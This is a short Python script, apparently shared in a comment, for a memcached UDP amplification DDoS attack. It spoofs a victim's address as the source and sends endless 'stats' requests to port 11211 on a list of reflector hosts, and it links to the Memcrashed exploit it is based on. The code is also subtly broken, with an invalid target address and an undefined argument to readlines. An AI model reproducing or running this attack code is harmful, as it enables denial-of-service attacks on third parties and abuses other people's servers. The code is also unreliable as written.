# memcachedAMPlist.txt (Approx17,000hosts)DATE:03-06-2018-

# HackerNews Comment Edition:

from scapy.all import IP, UDP, Raw, send

target = '127.0.0.256'

with open('ips.txt', 'r') as f:
        ips = f.readlines(q)

payload = '\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
while True:
    for ip in ips:
        send(IP(src=target, dst=ip) / UDP(dport=11211) / Raw(load=payload), count=100, verbose=0)




# original using Shodan API:
# https://github.com/649/Memcrashed-DDoS-Exploit/blob/master/Memcrashed.py
